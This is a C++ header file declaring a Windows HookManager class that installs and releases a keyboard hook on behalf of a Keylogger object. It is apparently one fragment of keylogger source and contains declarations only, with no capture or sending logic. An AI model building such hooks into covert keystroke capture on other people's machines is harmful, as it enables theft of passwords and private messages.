#ifndef HOOK_MANAGER_H
#define HOOK_MANAGER_H

#include "keylogger.h"

#include <Windows.h>

typedef LRESULT(__stdcall *HookCallback)(int, WPARAM, LPARAM);

class HookManager {
public:
    static LRESULT __stdcall ListenerHookCallback(int nCode, WPARAM wParam, LPARAM lParam);
    static void InstallKeyboardHook(Keylogger* keylogger);
    static void ReleaseHook();

private:
    static HHOOK _hook;
    static Keylogger* _keylogger;
    
    static void displayErrorMessage();
};

#endif
